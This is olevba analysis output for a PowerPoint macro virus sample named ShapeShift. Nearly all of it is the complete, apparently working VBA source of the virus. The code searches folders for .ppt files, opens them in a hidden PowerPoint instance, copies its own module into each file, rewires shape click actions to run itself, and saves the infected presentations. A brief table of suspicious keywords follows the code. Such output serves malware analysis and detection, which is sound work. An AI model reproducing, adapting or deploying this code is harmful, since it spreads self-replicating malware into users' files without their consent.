olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.ShapeShift-76b0f0dc27953ca5e1726d41cc98c05b33f7e856
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ShapeShift.bas 
in file: Virus.MSPPoint.ShapeShift-76b0f0dc27953ca5e1726d41cc98c05b33f7e856 - OLE stream: 'VBA/ShapeShift'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'PPT.ShapeShift v0.1 /1nternal
Private Home
Sub actionhook(Stealth)
    On Error Resume Next
    Set LastSlide = ActivePresentation.Slides(ActivePresentation.Slides.Count)
    Set Home = ActivePresentation
    If ActivePresentation.SlideShowWindow.View.Slide.SlideIndex = LastSlide.SlideIndex Then
        For Each InfPresentation In Presentations
            Call WackPresentation(InfPresentation)
        Next
        Set fs = Application.FileSearch
        fs.NewSearch
        fs.LookIn = ActivePresentation.Path
        fs.SearchSubFolders = True
        fs.FileName = "*.ppt"
        fs.Execute
        For Each target In fs.FoundFiles
            If InStr(1, target, "~", 1) = 0 Then
                dontadd = False
                Set PowerObj = CreateObject("PowerPoint.Application")
                PowerObj.Visible = False
                Set PVict = PowerObj.Presentations.Open(target)
                For i = 1 To Presentations.Count - 1
                    If Presentations(i).FullName = PVict.FullName Then dontadd = True
                Next
                If dontadd <> True Then Call WackPresentation(PVict)
                PVict.Close
                Set PVict = Nothing
            End If
        Next
    Else
        If Int(Rnd * 10) = 0 Then
            Call RandomWackSlide(ActivePresentation)
            For Each ShapetoWack In LastSlide.Shapes
                If ShapetoWack.Name = "hookme" Then ShapetoWack.Delete
            Next
            Call SlideIn(LastSlide)
            If Int(Rnd * 10) = 0 Then MsgBox ("PPT.ShapeShift v0.1 /1nternal")
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
Sub SlideIn(SlideW)
    On Error Resume Next
    dontadd = False
    For Each ShapetoWack In SlideW.Shapes
        If ShapetoWack.Name = "hookme" Then dontadd = True
    Next
    If dontadd <> True Then
        Set ShapetoWack = SlideW.Shapes.AddShape(Int(Rnd * 140) + 1, 0, 0, SlideW.Parent.PageSetup.SlideWidth, SlideW.Parent.PageSetup.SlideHeight)
        ShapetoWack.Name = "hookme"
        ShapetoWack.ZOrder (msoSendToBack)
        ShapetoWack.Line.Visible = False
        ShapetoWack.Fill.Visible = False
        Call WackShape(ShapetoWack)
    End If
    For Each ShapetoWack In SlideW.Shapes
        Call WackShape(ShapetoWack)
    Next
End Sub
Sub WackShape(ShapetoWack)
    On Error Resume Next
    If ShapetoWack.ActionSettings(ppMouseClick).Action = 0 Then
        ShapetoWack.ActionSettings(ppMouseClick).Action = ppActionRunMacro
        ShapetoWack.ActionSettings(ppMouseClick).Run = "actionhook"
    End If
End Sub
Sub RandomWackSlide(PresW)
    On Error Resume Next
    Set SlidetoWack = PresW.Slides(Int(Rnd * PresW.Slides.Count) + 1)
    Call WackShape(SlidetoWack.Shapes(Int(Rnd * SlidetoWack.Shapes.Count) + 1))
End Sub
Sub WackPresentation(InfPresentation)
    On Error Resume Next
    dontadd = False
    For Each ModComponent In InfPresentation.VBProject.VBComponents
        If ModComponent.Name = "ShapeShift" Then dontadd = True
    Next
    If dontadd <> True Then
        Set Slider = InfPresentation.Slides(InfPresentation.Slides.Count)
        Set NewMod = InfPresentation.VBProject.VBComponents.Add(1)
        NewMod.Name = "ShapeShift"
        NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("ShapeShift").CodeModule.Lines(1, Home.VBProject.VBComponents("ShapeShift").CodeModule.CountOfLines)
        Call SlideIn(Slider)
        Call RandomWackSlide(InfPresentation)
        Call RandomWackSlide(InfPresentation)
        Call RandomWackSlide(InfPresentation)
        InfPresentation.Save
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

